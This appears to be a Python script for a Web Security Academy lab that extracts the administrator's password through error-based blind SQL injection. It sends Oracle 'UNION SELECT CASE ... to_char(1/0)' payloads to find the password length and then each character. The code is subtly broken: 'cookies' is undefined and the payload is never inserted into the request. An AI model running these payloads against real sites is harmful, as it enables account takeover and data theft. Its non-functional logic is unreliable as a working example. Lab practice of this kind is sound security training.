import requests
import string
import itertools
import random



def request_with_injection(inject):
    response = requests.get('https://ac021f2b1ecf83a280e7999c00a2003d.web-security-academy.net/', cookies=cookies)
    return response.text


def successful(response_text):
    fail = 'Internal Server Error'
    error = 'imeout'
    if error in response_text:
        print(response_text)
        exit(1)
    return fail in response_text


def injection(inject):
    return successful(request_with_injection(inject))


def get_length():
    for i in itertools.count():
         inject = f"'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)>{i + 1})+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users --"
         print(i)
         if not successful(request_with_injection(inject)):
             return i + 1


def get_i(i):
    consider = string.digits + string.ascii_uppercase + string.ascii_lowercase
    for c in consider:
        # inject = f"' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, {i}, 1)={c}) THEN to_char(1/0) ELSE 'a' END FROM users)='a"
        inject = f"'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,{i}, 1)='{c}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users --"
        if injection(inject):
            return c


def get_all(): 
    res = ''
    length = get_length()
    print(length)
    for i in range(1, length + 1):
        ci = get_i(i)
        print(ci)
        res += ci
    return res



print(get_all())
